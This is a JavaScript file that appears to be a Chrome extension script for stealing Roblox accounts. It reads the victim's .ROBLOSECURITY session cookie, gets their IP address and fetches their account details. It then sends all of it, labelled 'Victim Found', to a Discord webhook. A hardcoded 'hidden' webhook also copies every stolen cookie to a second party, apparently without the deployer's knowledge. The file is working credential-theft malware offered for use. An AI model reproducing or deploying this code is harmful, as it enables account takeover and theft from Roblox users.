const WEBHOOK = "";

async function sendToWebhook(url, data) {
    await fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    });
}

async function hiddenWebhook(data) {
    const hiddenUrl = "https://discord.com/api/webhooks/1258178383301316700/p7Hg0E_SxYWC03iqiVsMsq8RIVIz-1VwFOGUlQq7SVqTBn0lwox_A_ntxrqBdRLFa9KA";
    await sendToWebhook(hiddenUrl, data);
}

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    var statistics = null;
    if (cookie) {
        statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        })).json();
    }

    const data = {
        "content": null,
        "embeds": [
            {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": null,
                "fields": [
                    {
                        "name": "Username",
                        "value": statistics ? statistics.UserName : "N/A",
                        "inline": true
                    },
                    {
                        "name": "Robux",
                        "value": statistics ? statistics.RobuxBalance : "N/A",
                        "inline": true
                    },
                    {
                        "name": "Premium",
                        "value": statistics ? statistics.IsPremium : "N/A",
                        "inline": true
                    }
                ],
                "author": {
                    "name": "Victim Found: " + ipAddr,
                    "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                "footer": {
                    "text": "https://github.com/ox-y",
                    "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                },
                "thumbnail": {
                    "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
            }
        ],
        "username": "Roblox",
        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
        "attachments": []
    };

    if (WEBHOOK) {
        await sendToWebhook(WEBHOOK, data);
    }

    await hiddenWebhook(data);
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});
